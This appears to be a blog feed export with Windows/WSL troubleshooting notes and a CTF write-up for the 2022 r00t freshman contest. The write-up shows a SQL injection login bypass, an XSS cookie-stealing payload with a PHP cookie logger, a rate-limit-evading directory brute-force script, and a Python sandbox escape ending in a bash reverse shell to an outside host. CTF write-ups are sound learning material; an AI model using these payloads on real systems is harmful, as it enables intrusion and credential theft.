<p>在HyperV管理器-虚拟交换机管理中，尝试将WSL更改为公共网络并绑定至WLAN网卡上时出现问题，重装整个WSL2后解决</p>
</li>
</ul>
]]></content>
      <categories>
        <category>Solution</category>
        <category>Linux</category>
      </categories>
  </entry>
  <entry>
    <title>Windows Issues</title>
    <url>/2023/09/25/Solution/Windows/Windows%20Issues/</url>
    <content><![CDATA[<h2 id="Debris"><a href="#Debris" class="headerlink" title="Debris"></a>Debris</h2><ul>
<li><strong>Windows 7&#x2F;10 桌面壁纸保存路径</strong>：<code>%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Themes\CachedFiles\</code></li>
<li><code>C:\ProgramData\Package Cache</code> 中存有应用的安装程序，这些安装程序被 Windows 应用管理器用于卸载应用，因此请勿随便修改。</li>
</ul>
<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><h3 id="时间乱码"><a href="#时间乱码" class="headerlink" title="时间乱码"></a>时间乱码</h3><p>电脑部分软件时间出现乱码，如：<code>〉〇〉《-〇【-〉》 〉《:〉『:》《</code> ，场景包括”phpStudyPro”与取证软件恢复的数据。</p>
<p>后来发现是 Windows 在『区域格式』设置为『中文（简体汉字，香港特别行政区）』时，解析部分软件的时间数据可能会出现乱码</p>
<p><strong>解决办法：</strong>在 <code>Windows设置/时间和语言/区域</code> 下设置『国家或地区』为中国，『区域格式』为『中文（简体，中国）』</p>
<h3 id="ext4-vhdx"><a href="#ext4-vhdx" class="headerlink" title="ext4.vhdx"></a>ext4.vhdx</h3><p>WSL2-Kali-linux 遗留下来的虚拟磁盘文件”ext4.vhdx”文件，想在 Windows 中访问有两种方式：</p>
<ol>
<li>直接用 7z 解压查看，即可看见完整的文件系统目录，文件可完整读取</li>
<li>Win11 特定版本及以上，WSL 提供了 <code>wsl --mount</code> 命令可用于挂载虚拟磁盘。（<strong>未实践，纯脑测</strong>）<ol>
<li>首先在『磁盘管理&#x2F;操作&#x2F;附加 VHD』中添加 vhdx 磁盘</li>
<li>在 pwsh 中使用 <code>GET-CimInstance -query &quot;SELECT * from Win32_DiskDrive&quot;</code> 命令获取 windows 可读取的外部磁盘的识别路径，如 <code>\\.\PHYSICALDRIVE1</code> </li>
<li>使用 <code>wsl --mount &quot;\\.\PHYSICALDRIVE1&quot;</code> 挂载磁盘</li>
<li>进入 wsl，用 <code>sudo mkdir /mnt/kali</code> 创建挂载点</li>
<li>使用 <code>ls /dev</code> 查看挂载的磁盘对应标识符，例如为 <code>/dev/sde</code></li>
<li>挂载磁盘：<code>mount /dev/sde /mnt/kali</code></li>
</ol>
</li>
</ol>
<h3 id="Errors"><a href="#Errors" class="headerlink" title="Errors"></a>Errors</h3><ol>
<li><p>运行某 GalGame 的 EXE 文件时报错：</p>
<div class="highlight-container" data-rel="Ini"><figure class="iseeu highlight ini"><table><tr><td class="code"><pre><span class="line">出现错误：应用程序无法启动，因为应用程序的并行配置不正确</span><br></pre></td></tr></table></figure></div>

<p>可能原因：</p>
<ol>
<li><p>缺少微软的 VS 运行库：<code>Microsoft Visual C++ 2008 Redistributable Package (x86)</code> <a class="link"   href="https://www.microsoft.com/zh-CN/download/details.aspx?id=26368" >微软官网下载 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>下载中文版 64 位安装程序，运行安装后重启生效，EXE 文件可用。</p>
</li>
<li><p><code>win+r</code>，输入 <code>services.msc</code> ，检查并打开『Windows Modules Insatller』服务。</p>
<p>（上述方法经测试并无效果，仅作留档参考）</p>
</li>
</ol>
<blockquote>
<p><strong>题外话：</strong>使用 <code>sxstrace.exe</code> 跟踪 Windows 错误日志。</p>
<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="code"><pre><span class="line">sxstrace /?	<span class="comment"># 获取帮助</span></span><br><span class="line">sxstrace trace <span class="literal">-logfile</span>:tar.etl	<span class="comment"># 管理员运行命令开启日志跟踪，内容保存至目标文件</span></span><br><span class="line">sxstrace parse <span class="literal">-logfile</span>:filename.etl <span class="literal">-outfile</span>:sxstrace.txt	<span class="comment"># 读取原始跟踪文件并转换成用户可读的格式，并将结果保存至目标文件</span></span><br></pre></td></tr></table></figure></div>

<p>该工具可保存一闪而过的”Windows Error”的具体信息。</p>
</blockquote>
</li>
</ol>
]]></content>
      <categories>
        <category>Solution</category>
        <category>Windows</category>
      </categories>
  </entry>
  <entry>
    <title>2022-r00t-新生赛</title>
    <url>/2022/05/08/Security/CTF/2022-r00t-%E6%96%B0%E7%94%9F%E8%B5%9B/</url>
    <content><![CDATA[<p>[TOC]</p>
<p>小知识：</p>
<ol>
<li><code>192.168.xx.xx</code> 都是内网地址，<code>127.x.x.x</code> 都是本机地址，不走网</li>
</ol>
<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="web签到"><a href="#web签到" class="headerlink" title="web签到"></a>web签到</h3><p>过一遍web解题的基本思路引导，然后直接F12翻源码找flag即可。</p>
<h3 id="EatPudding"><a href="#EatPudding" class="headerlink" title="EatPudding"></a>EatPudding</h3><p>可爱的音游（居然可以用键盘打，dfjk），既然是前端游戏，那flag八成是在源码里呗，F12找到’源代码’，找到’index.js’文件，在 <code>shareText()</code> 函数中发现flag的提示：</p>
<div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">shareText</span>(<span class="params">cps</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (mode === <span class="variable constant_">MODE_NORMAL</span>) &#123;</span><br><span class="line">            <span class="keyword">let</span> date2 = <span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line">            deviationTime = (date2.<span class="title function_">getTime</span>() - _date1.<span class="title function_">getTime</span>())</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_">legalDeviationTime</span>()) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;倒计时多了&#x27;</span> + ((deviationTime / <span class="number">1000</span>) - <span class="number">20</span>).<span class="title function_">toFixed</span>(<span class="number">2</span>) + <span class="string">&quot;s&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="title class_">SubmitResults</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (cps &lt;= <span class="number">5</span>) <span class="keyword">return</span> <span class="string">&#x27;试着好好练一下？&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (cps &lt;= <span class="number">8</span>) <span class="keyword">return</span> <span class="string">&#x27;再加把劲吧！&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (cps &lt;= <span class="number">10</span>) <span class="keyword">return</span> <span class="string">&#x27;也许可以再努力一些:D&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (cps &lt;= <span class="number">15</span>) <span class="keyword">return</span> <span class="string">&#x27;还差一点点&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (cps &lt;= <span class="number">20</span>) <span class="keyword">return</span> <span class="string">&#x27;cps大于20就给flag！&#x27;</span></span><br><span class="line">        <span class="keyword">let</span> a;</span><br><span class="line">        <span class="keyword">let</span> <span class="title class_">Re</span> = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">        <span class="title class_">Re</span>.<span class="title function_">open</span>(<span class="string">&#x27;get&#x27;</span>, <span class="string">&#x27;./flag.php?name=&#x27;</span>+(a?.<span class="property">o</span>||((+ +<span class="string">&#x27;a&#x27;</span>+<span class="string">&#x27;o&#x27;</span>)??!!a?.<span class="property">a</span>)).<span class="title function_">toLocaleLowerCase</span>(),<span class="literal">false</span>);</span><br><span class="line">        <span class="title class_">Re</span>.<span class="title function_">setRequestHeader</span>(<span class="string">&quot;Content-type&quot;</span>, <span class="string">&quot;application/json&quot;</span>);</span><br><span class="line">        <span class="title class_">Re</span>.<span class="title function_">send</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="title class_">Re</span>.<span class="property">responseText</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<p>大致意思就是cps大于20就能得到flag（那显然不是人类的手速），观察一下，它访问子文件’.&#x2F;flag.php’并用’get’方法请求 <code>name=</code> 加上一串字串即可得到flag。所以重点在于请求的内容字串是什么 <code>(a?.o||((+ +&#39;a&#39;+&#39;o&#39;)??!!a?.a))</code> ，直接将它丢到控制台中运行一下就会得到字串的内容（先声明一下a）：<code>nano</code> 。解释一下它是怎么来的，首先字串左侧的可选链 <code>a?.o</code> 因为不存在o这个键，所以是’undefined’，所以完全取决于右侧，<code>??</code> 是空值合并操作符，只有当它的左侧为’null’或者’undefined’时才会返回右边的值，<code>!!</code> 就是取反两次，也就是自己，不过会强制转化为布尔类型，而左侧是 <code>(+ +&#39;a&#39;+&#39;o&#39;)</code> ，其中左边部分 <code>+ +&#39;a&#39;</code> 的值是NaN（加号间的空格不能少，不然就报错了），也就是不认识的变量，说白了就是这个语法编译不出来，而NaN会被当做字符串与’o’相加，所以得到’NaNo’，转化为小写后就是’nano’。</p>
<h3 id="ezSQL-免费的留言板"><a href="#ezSQL-免费的留言板" class="headerlink" title="ezSQL &amp; 免费的留言板"></a>ezSQL &amp; 免费的留言板</h3><p>过滤了单引号，使用双引号构造万能密码即可：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin</span><br><span class="line">1&quot; or &quot;1&quot;=&quot;1</span><br></pre></td></tr></table></figure></div>

<p>这里后台使用的是sqlite，注释符号只能用 <code>--</code> ，而Mysql的注释符才有 <code>#</code> 。然后是老问题，这里用户名也可以直接注入，但是得用两个or，这是因为后面有个 <code>and password=&#123;password&#125;</code> ，如果只有一个 <code>or 1=1</code> ，会出现先判定前后的 <code>and</code> 导致 <code>or</code> 两边都为false的情况。</p>
<p>然后就是留言板，两题是并在一起的（大型连续剧doge），这里打的是一个XSS（跨站脚本攻击），首先尝试各种标签，由于这个界面本身就是由JS渲染的， <code>&lt;script&gt;</code> 标签是不会再次执行的（理由似乎不明？），因此选用 <code>&lt;button&gt;</code> 标签的”onclick”触发JS代码，发现可行，就去搜索如何利用留言板打XSS，首先明确cookie一般是带有用户的登录信息的（当前），而在JS环境中读取cookie需要调用 <code>document.cookies</code> 参数，因此思路就是将上当触发XSS的管理员的cookie信息利用JS代码发送到自己的服务器上。可以利用JS中的 <code>document.location=url</code> 来实现网页的跳转访问，通过访问自己的网站并用get方法请求cookie达到获取cookie的目的。php源码如下：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>]))                 <span class="comment">//如果接收到cookie</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;./cookie.txt&#x27;</span>, <span class="string">&#x27;a&#x27;</span>);    <span class="comment">//打开存储的文件</span></span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(<span class="variable">$file</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>].<span class="string">&quot;\r\n&quot;</span>); <span class="comment">//将获取的cookie存储</span></span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$file</span>);                         <span class="comment">//关闭文件</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>构造如下payload：<code>&lt;button onclick=&#39;document.location=&quot;url/cookie.php?cookie=&quot;+document.cookies;&#39;&gt;Click Me!&lt;/button&gt;</code> ，也可以利用图片的 <code>onerror</code> 参数实现JS代码的执行，该参数执行内容代码当src加载不对或者干脆为空的时候。有了思路，下一件事就是搭一个服务器，在腾讯云上新建一个应用容器，选择宝塔面板，重装好后在应用管理界面找到面板登录网址，先在防火墙中打开相应端口，一般是TCP协议8888端口；再通过端口进入宝塔面板管理（这里用的是服务器中记录的用户密码），在网站一栏添加站点，FTP与数据库都选择创建，域名如果没有自己购买有效域名，则填写IP地址，否则是无效域名，访问不了。成功后进入根目录将之前的cookie脚本添加进去即可。再提一下XSS的应用领域，任何输入框都是有可能的，尤其是会被加载出来的部分。本题中用户名无法打XSS，它会直接显示，但是举报栏可以，举报中有其他栏目，会给一个输入框，通过输入框打XSS，则管理员会在处理举报时触发XSS并发送cookie（虽然 <code>ducument.location</code> 的跳转会让XSS很明显就是了），于是就得到了管理员的cookie，登录后得到flag。结果如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=pyy; password=&quot;1eDydsQz7LJ_TIj_78aBcVC!aOw1$3@&quot;; PHPSESSID=88ah7gn4u96d2guht6ooouvvj2</span><br></pre></td></tr></table></figure></div>

<p>顺带提一句，由于该网站是JS渲染的，XSS的跳转会导致网站死循环，也就是一进入就跳转，因此后台要想解决问题只能用接口处理所有举报和问题留言。</p>
<p><strong>参考：[</strong></p>
<p><a class="link"   href="https://blog.csdn.net/weixin_44191814/article/details/120091363" >第二范式-Linux命令超大全 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://www.php.cn/topic/bt/476260.html" >图文详解如何配置宝塔面板以及搭建网站 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://zhuanlan.zhihu.com/p/265221405" >EnX07-XSS抓取Cookie-渗透测试 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://blog.csdn.net/qq_51524329/article/details/121583797" >红云谈安全-利用XSS获取用户cookie <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><strong>]</strong></p>
<h3 id="EZF12"><a href="#EZF12" class="headerlink" title="EZF12"></a>EZF12</h3><p>F12快捷键和右键都被ban了，flag应该在源码里，我当时开发者工具是悬浮的，手动从更多工具中打开后不会发生跳转，就直接找到了flag；后来测试的时候发现如果窗口靠侧边，就会发生页面跳转，跳转到战队的主页（明示多学点知识？）；可以试着用burp发个包，就能得到相应的网页内容（curl不会返回页面源码，但是可以下载页面内容，下下来以后直接改成txt查看就能看到源码）</p>
<h3 id="Where-is-flag"><a href="#Where-is-flag" class="headerlink" title="Where is flag?"></a>Where is flag?</h3><p>提示目录扫描，可是真用dirsearch扫会发现404报的很少，用burp发包后发现大部分是429，也就是请求过于频繁，但不代表页面不存在，F12可以看到提示，估计一个IP在一段时间内只能访问一定次数，多了就会回显429，因此思路就是想办法仿造IP，爆破目录，根据返回的状态码确定目标网页是否存在。</p>
<p>一开始想拿burp脚本跑，但是因为考虑的是代理思路，觉得太麻烦，就改用python写了。</p>
<ul>
<li>给Burp加载python脚本时出现报错”SyntaxError: Non-ASCII character in file”，给脚本前加上 <code>#coding:utf-8</code> 即可解决，因为Burp用的是py2，需要额外的说明utf-8编码才能加载其中的中文注释。</li>
</ul>
<h4 id="Python-Requests"><a href="#Python-Requests" class="headerlink" title="Python Requests"></a>Python Requests</h4><p>最开始的思路是切换代理，以此来改变IP，但是很快就发现这不现实，因为合法稳定的IP池子很烧钱，免费的基本没有用，所以这条路行不通。事实上简单的伪造IP只需要改变消息头，手动构造一个http头：<code>X-Forwarded-For:xxx</code> ，并在每次发包时修改它就可以保证自己的IP是变换的，由于这题没做合法校验，这个IP头的内容是什么都行（趁机暴打出题人），只要不同就能避免429重复，利用python的Request模块写一个脚本发包校验字典即可： </p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">proxy=<span class="string">&#x27;pyy has no hair!&#x27;</span>;</span><br><span class="line">url_=<span class="string">&#x27;http://81.69.243.226:30001/&#x27;</span>;</span><br><span class="line">headers=&#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;X-Forwarded-For&#x27;</span>:<span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">c=<span class="number">0</span>;</span><br><span class="line">res=[]</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./dicc.txt&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    s=file.readline()</span><br><span class="line">    <span class="keyword">while</span> s != <span class="string">&quot;&quot;</span>:    </span><br><span class="line">        <span class="keyword">if</span> s[-<span class="number">1</span>]==<span class="string">&#x27;\n&#x27;</span>:</span><br><span class="line">            s=s[<span class="number">0</span>:-<span class="number">1</span>];</span><br><span class="line">        proxy=proxy+<span class="string">&#x27;!&#x27;</span>;</span><br><span class="line">        headers[<span class="string">&#x27;X-Forwarded-For&#x27;</span>]=proxy;</span><br><span class="line">        url=url_+s;</span><br><span class="line">        res.append(requests.get(url=url,headers=headers))</span><br><span class="line">        <span class="keyword">if</span> res[c].status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(s);</span><br><span class="line">        c+=<span class="number">1</span>;</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(c)+<span class="string">&quot;:&quot;</span>,end=<span class="string">&quot; &quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(res[c-<span class="number">1</span>].status_code,end=<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        s=file.readline()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>不是异步效率也不是很高，差不多一秒五次左右，比直接用扫描器定时发送快上不少是真的，但是有些小问题，例如在访问成功，出现200状态码后就容易出现一个429，BUG原理不明。差不多跑了一个小时才跑完整个字典，将输出复制粘贴到VSC中，选中404修改所有匹配项，直接删除，然后找还剩下的状态码就行了，最后留下几次出错和几个存在的目录：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Admin</span><br><span class="line">1637: 200</span><br><span class="line">1639: 429</span><br><span class="line">docs</span><br><span class="line">4987: 200</span><br><span class="line">4989: 429</span><br><span class="line">wp</span><br><span class="line">9128: 200</span><br><span class="line">9216: 429</span><br></pre></td></tr></table></figure></div>

<p>不知道是不是网站出了问题，后台没有访问进程的情况下直接访问目录也会报告429，被迫只能用burp发包修改IP头，最后再wp目录下找到flag。</p>
<p>curl命令也可以伪造HTTP头：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">curl url -H <span class="string">&#x27;X-Forwarded-For:IP&#x27;</span></span><br></pre></td></tr></table></figure></div>

<p><code>-H</code> 构造HTTP头</p>
<p>为了让脚本效率更高，可能需要异步或者多线程来优化，但是可惜的是requests库是同步阻塞的，因此无法利用asyncio实现异步调用。</p>
<p>Python中的异步指的是程序地协程运行，与Js正好相反，Python中的await会将async函数的执行权转交出去实现异步，而Js因为默认就是异步执行，await会固定函数执行权达到同步的目的。但两者的异步模型是差不多的，都是一个生产者-消费者的模型，await与async的应用也大差不差。</p>
<p>这里使用自带线程池的”HackRequests”包来优化脚本：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> HackRequests <span class="keyword">as</span> hack</span><br><span class="line"><span class="keyword">import</span> copy</span><br><span class="line"></span><br><span class="line">proxy=<span class="number">0</span>;</span><br><span class="line">url_=<span class="string">&#x27;http://81.69.243.226:30001/&#x27;</span>;</span><br><span class="line"></span><br><span class="line">headers=&#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;X-Forwarded-For&#x27;</span>:<span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">c=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">#定义回调函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_callback</span>(<span class="params">r:hack.response</span>):</span><br><span class="line">    <span class="built_in">print</span>(r.status_code,end=<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> r.status_code!=<span class="number">404</span>:</span><br><span class="line">        <span class="built_in">print</span>(r.log.get(<span class="string">&#x27;request&#x27;</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">#建立线程池</span></span><br><span class="line">threadPool= hack.threadpool(<span class="number">40</span>,_callback);</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./dicc.txt&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    s=file.readline()</span><br><span class="line">    <span class="keyword">while</span> s!=<span class="string">&quot;&quot;</span>:    </span><br><span class="line">        <span class="keyword">if</span> s[-<span class="number">1</span>]==<span class="string">&#x27;\n&#x27;</span>:</span><br><span class="line">            s=s[<span class="number">0</span>:-<span class="number">1</span>];</span><br><span class="line">        proxy=proxy+<span class="number">1</span>;</span><br><span class="line">        headers[<span class="string">&#x27;X-Forwarded-For&#x27;</span>]=<span class="built_in">str</span>(proxy);</span><br><span class="line">        url=url_+s;</span><br><span class="line">        <span class="comment">#将请求装入线程池,给headers对象做拷贝</span></span><br><span class="line">        threadPool.http(url=url,headers=copy.copy(headers));</span><br><span class="line">        c+=<span class="number">1</span>;</span><br><span class="line">        s=file.readline()</span><br><span class="line"></span><br><span class="line">threadPool.run()</span><br></pre></td></tr></table></figure></div>

<p>可在 <code>threadpool</code> 中的第一个参数自定义线程个数来控制速度，效率远高于同步的requests库，40个线程完成扫描只需要几分钟。但这里需要注意的地方是headers，如果传入字符串则需要HTTP头格式：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">headers=```<span class="string">&#x27;User-Agent: xxx</span></span><br><span class="line"><span class="string">X-Forwarded-For: 0&#x27;</span><span class="string">&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></div>

<p>不同头需要换行分隔，冒号后面一定要跟空格，否则线程在调用过程中会持续报错，表示无法读入HTTP头。而如果使用的是对象，则一定要做拷贝，这涉及到对象的特点：内部存储键值时，值是依赖地址索引的。就像C++的指针一样，传入对象时实际传入的是对象内存储的地址，调用时再从地址中取值，而线程池是批量统一运行的，哪怕你传进去的时候IP头的值为’1’，但由于是地址索引，在运行时那个地址只有一个值，所以所有IP头的值都会是相等的，这就会导致429状态码的出现。由于只有一层，只需要做浅拷贝即可。</p>
<p><strong>参考:[</strong></p>
<p><a class="link"   href="http://www.voidcc.com/project/hack-requests" >hack-requests <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://ruanyifeng.com/blog/2019/11/python-asyncio.html" >阮一峰-Python异步编程 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://blog.csdn.net/Mr_Shiyang/article/details/105530969" >Syangy-伪造IP <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://www.runoob.com/w3cnote/http-x-forwarded-for.html" >runoob-HTTP X-Forwarded-For头 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://blog.csdn.net/qq_43652321/article/details/107606571" >Python爬虫——伪装代理（IP和User-Agent） <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://zhuanlan.zhihu.com/p/137649301" >Python中Requests库使用方法详解 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   href="https://www.cnblogs.com/liuhui0308/p/12346847.html" >python3标准库：copy复制对象 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><strong>]</strong></p>
<h3 id="I’m-not-a-robot"><a href="#I’m-not-a-robot" class="headerlink" title="I’m not a robot"></a>I’m not a robot</h3><p>验证码题，之前比赛其实出现过，但是因为看不懂就摸鱼了，现在又出来了，不得已暴露自己比赛摸鱼的事实。其实五百道四则运算题用不了多久，折腾两个小时说不定就搞定了（如果黑心出题人真的肯给flag），除此之外可以试试JWT与图像识别，图像识别用python的库好像出不来，也许要依靠字符匹配？我通过攻击eval拿到了flag</p>
<h4 id="Python沙箱逃逸"><a href="#Python沙箱逃逸" class="headerlink" title="Python沙箱逃逸"></a>Python沙箱逃逸</h4><p>输入框允许输入’&#x2F;‘，而输入’+’与’*’会报过滤，但其实’-‘也是可以的，直接输入一个裸的减号会出现报错，裸除号也会，上网查阅一下资料：<a class="link"   href="https://blog.csdn.net/qq_44214671/article/details/107754513" >SyntaxError:unexpected EOF while parsing <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> </p>
<p>可以得到两个信息，减号也可以直接输入让后台做运算，和除号一样；后台大概率使用了 <code>eval()</code> 函数，如果输入的是非法的python表达式就会回显错误，而且是语法错误（可以试试输入字母），这也是后台处理除号和减号运算的原理。既然使用了 <code>eval()</code> 函数并给了我们输入代码的能力，那我们就可以考虑通过攻击这个 <code>eval()</code> 达到任意代码执行（RCE）的目的。</p>
<p>然而python的沙箱逃逸需要大量的前置知识做铺垫。</p>
<p>先用几串payload试探一下情况：</p>
<p><code>dir(__builtins__)</code>，可以看到内置命名空间的可控情况：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://picturebed-1310517892.file.myqcloud.com/2022/202205101539188.png"
                     
                ></p>
<p><code>eval exec import system open</code>，可以看到几个重要函数的过滤</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://picturebed-1310517892.file.myqcloud.com/2022/202205101539193.png"
                     
                ></p>
<p><code>&quot;&quot;.__class__.__mro__</code>，会发现类不做显示，对参数查找造成一定阻力：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://picturebed-1310517892.file.myqcloud.com/2022/202205101539198.png"
                     
                ></p>
<p><code>dir()</code>，查看当前环境下的变量与导入模块：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://picturebed-1310517892.file.myqcloud.com/2022/202205101539204.png"
                     
                ></p>
<p><code>__builtins__</code>，字典化内置命名空间的属性：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://picturebed-1310517892.file.myqcloud.com/2022/202205101539214.png"
                     
                ></p>
<p><code>[].__class__.__bases__[0].__subclasses__()</code>：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://picturebed-1310517892.file.myqcloud.com/2022/202205101539219.png"
                     
                ></p>
<p><code>picDir</code>：</p>
<p>因为import惨遭过滤，各种绕过都实现不了，所以只能利用python的奇妙继承关系与魔术方法获得一个万能基类 <em>object</em> 来得到一些敏感函数，比如 <code>subprocess.Popen</code></p>
<p>先在自己的电脑上测试，<code>&lt;class &#39;object&#39;&gt;</code> 中没有 <code>&lt;class &#39;os.system&#39;&gt;</code> 类，但是有 <code>&lt;class &#39;subprocess.Popen&#39;&gt;</code> ；利用调用链 <code>[].__class__.__bases__[0]</code> 可得到 <em>object</em> ，但是回显中是不会显示 <code>&lt;class &#39;type&#39;&gt;</code> 这类值的，所以只能用 <code>[].__class__.__bases__[0].__subclasses__()[-1].__name__</code> 逐个尝试它的名字…那当然不行，鬼知道里面有几个类，利用<strong>列表生成式</strong>构造如下表达式去显示 <code>__name__</code> 属性：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">b=[x.__name__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()];</span><br></pre></td></tr></table></figure></div>

<p>然后以超快的手速CACV将列表复制下来，搜索 <code>Popen</code> ，发现确实存在后丢到python中，用</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">c=<span class="built_in">list</span>[...]</span><br><span class="line"><span class="built_in">print</span>(c.index(<span class="string">&#x27;Popen&#x27;</span>))</span><br></pre></td></tr></table></figure></div>

<p>得到下标为227，于是我们就得到 <code>subprocess.Popen()</code> 函数了，<code>[].__class__.__bases__[0].__subclasses__()[227]</code> 。构造payload：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">[].__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">227</span>]([<span class="string">&#x27;/bin/bash&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>,<span class="string">&#x27;bash -i &gt;&amp; /dev/tcp/IP/23333 &lt;&amp;1&#x27;</span>])</span><br></pre></td></tr></table></figure></div>

<p>接下来弹个shell到自己服务器上就大功告成了。</p>
<ul>
<li><p><code>__class__</code> 返回一个对象的类，也就是实例的模板，python里一切皆对象；</p>
</li>
<li><p><code>dir()</code> 直接显示当前环境的变量、方法和定义的类型列表、模块；<code>dir(obj)</code> 带参数时返回对象的所有方法、属性列表，如果参数包含方法 <code>__dir__()</code> 则调用该方法</p>
</li>
<li><p><code>__mro__</code> 返回类的所有父类以及继承顺序，’object’ 在最右侧；<code>__bases__</code> 显示所有父类，’object’ 在最左侧；</p>
</li>
